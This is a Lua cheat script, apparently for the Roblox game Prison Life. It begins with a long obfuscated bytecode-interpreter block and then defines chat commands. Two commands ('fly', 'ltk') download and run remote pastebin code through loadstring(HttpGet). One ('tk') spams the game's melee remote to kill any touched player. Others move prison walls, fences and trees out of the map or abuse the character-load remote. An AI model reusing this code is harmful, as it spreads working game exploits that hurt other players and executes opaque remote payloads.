k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))end;elseif g<=333 then if g<=327 then if g<=324 then if g==323 then local f=a[2];local e={};for a=1,#l do local a=l[a];for b=0,#a do local b=a[b];local d=b[1];local a=b[2];if d==c and a>=f then e[a]=d[a];b[1]=e;end;end;end;else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=325 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g>326 then c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=330 then if g<=328 then local b=a[2]local e={c[b](f(c,b+1,h))};local d=0;for a=b,a[4]do d=d+1;c[a]=e[d];end elseif g>329 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=331 then local k;local m,l;local j;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];g=a[2]m,l=i(c[g](c[g+1]))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;elseif g==332 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];do return end;else e[a[3]]=c[a[2]];end;elseif g<=338 then if g<=335 then if g>334 then local d=a[2];local f=a[4];local e=d+2 local d={c[d](c[d+1],c[e])};for a=1,f do c[e+a]=d[a];end;local d=d[1]if d then c[e]=d b=a[3];else b=b+1;end;else local b=a[2]c[b](f(c,b+1,a[3]))end;elseif g<=336 then local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))elseif g>337 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))else local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))end;elseif g<=341 then if g<=339 then local g;local e;c[a[2]]=k[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=k[a[3]];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];do return end;elseif g==340 then c[a[2]]=(a[3]~=0);else local i;local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];i=c[g];for a=g+1,a[3]do m(i,c[a])end;end;elseif g<=342 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g==343 then local g;local e;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];e=a[2]c[e](f(c,e+1,a[3]))else local d=a[2]local e={c[d](c[d+1])};local b=0;for a=d,a[4]do b=b+1;c[a]=e[b];end end;b=b+1;end;end);end;return n(true,{},r())();end)(string.byte,table.insert,setmetatable);

			elseif msg:match(prefix .. "fly") then
				-- Press "E" to fly and unfly
				-- You have to re-apply the script if you die
				loadstring(game:HttpGet("https://pastebin.com/raw/7rXZ9VNc", true))()
			elseif msg:match(prefix .. "fences on") then
                game.Workspace.Prison_Fences.Parent = game.Lighting
                game.Workspace.Prison_Fences.Parent = game.Lighting
			elseif msg:match(prefix .. "fences off") then
				game.Lighting.Prison_Fences.Parent = game.workspace
				game.Lighting.Prison_Fences.Parent = workspace.Prison_Fences
			elseif msg:match(prefix .. "walls on") then
L = game.Lighting
PH = workspace.Prison_Halls
PGO = workspace.Prison_Guard_Outpost
PA = workspace.Prison_Administration
PCB = workspace.Prison_Cellblock
CFT = workspace.Prison_Cafeteria
GA = workspace.Garages
PGB = workspace.GuardBooth
PH.walls.Parent = game.Lighting
PH.lights.Parent = game.Lighting
PH.roof.Parent = game.Lighting
PH.glass.Parent = game.Lighting
PGO.doorwindow.Parent = game.Lighting
PGO.wall.Parent = game.Lighting
PGO.lights.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.wallsegment.Parent = game.Lighting
PGO.part.Parent = game.Lighting
PGO.Part.Parent = game.Lighting
PA.walls.Parent = game.Lighting
PA.Part.Parent = game.Lighting
PA.Part.Parent = game.Lighting
PA.Part.Parent = game.Lighting
PA.trim.Parent = game.Lighting
PA.trim.Parent = game.Lighting
PA.trimboi.Parent = game.Lighting
PA.front.Parent = game.Lighting
PCB.b_front.Parent = game.Lighting
PCB.b_wall.Parent = game.Lighting
PCB.c_wall.Parent = game.Lighting
PCB.a_walls.Parent = game.Lighting
PCB.a_front.Parent = game.Lighting
PCB.c_ceiling.Parent = game.Lighting
PCB.a_ceiling.Parent = game.Lighting
PCB.b_ceiling.Parent = game.Lighting
PCB.a_outerwall.Parent = game.Lighting
PCB.b_outerwall.Parent = game.Lighting
PCB.a_lights.Parent = game.Lighting
PCB.b_lights.Parent = game.Lighting
PCB.c_lights.Parent = game.Lighting
PCB.Wedge.Parent = game.Lighting
PCB.Wedge.Parent = game.Lighting
CFT.building.Parent = game.Lighting
CFT.lights.Parent = game.Lighting
CFT.glassdividers.Parent = game.Lighting
CFT.Wedge.Parent = L
CFT.Wedge.Parent = L
CFT.Wedge.Parent = L
PCB.c_hallwall.Parent = L
PCB.c_hallwall.Parent = L
PCB.c_hallwall.Parent = L
PCB.c_hallwall.Parent = L
PCB.c_corner.Parent = L
PCB.c_corner.Parent = L
PCB.c_corner.Parent = L
PCB.c_corner.Parent = L
PCB.c_glass.Parent = L
CFT.Floor.Parent = L
CFT.Floor.Parent = L
CFT.Floor.Parent = L
CFT.Floor.Parent = L
CFT.Model.Parent = L
CFT.Model.Parent = L
CFT.glass.Parent = L
PGO.window.Parent = L
PA.light_floor1.Parent = L
PA.light_floor2.Parent = L
PA.Part.Parent = L
GA.Parent = L
PGB.Prison_bollards.Parent = L
PGB.Wedge.Parent = L
PGB.Wedge.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Stonewall.Parent = L
PGB.Part.Parent = L
PGB.Part.Parent = L
PGB.Model.Parent = L
PGB.Model.Parent = L
			elseif msg:match(prefix .. "outer on") then
				game.workspace.Prison_OuterWall.prison_wall.Parent = game.Lighting
			elseif msg:match(prefix .. "outer off") then
				game.Lighting.prison_wall.Parent = game.workspace.Prison_OuterWall
			elseif msg:match(prefix .. "trees on") then
				for i = 1,99 do
   			        game.workspace.Trees.Parent = game.Lighting
    				game.workspace.Prison_Trees.Parent = game.Lighting
				end
			elseif msg:match(prefix .. "trees off") then
				for i = 1,99 do
    				game.Lighting.Trees.Parent = workspace
    				game.Lighting.Prison_Trees.Parent = workspace
				end
			elseif msg:match(prefix .. "tk") then
    game.Players.LocalPlayer.Character.Torso.Touched:Connect(function(k)
    if game.Players[k.Parent.Name] ~= nil then
        repeat
                local args = {
                [1] = game:GetService("Players")[k.Parent.Name]
                }
                game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
                game:GetService("RunService").RenderStepped:Wait()
        until k.Parent.Humanoid.Health == 0
    end
end)
			elseif msg:match(prefix .. "ltk") then
				loadstring(game:HttpGet('https://pastebin.com/raw/x4qbirTD', true))()
			elseif msg:match(prefix .. "rgb on") then
_G.toggle = true

while _G.toggle == true do
wait()
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Light yellow"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Bright red"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Bright yellow"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Hot pink"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Plum"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Crimson"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Sunrise"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Really black"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
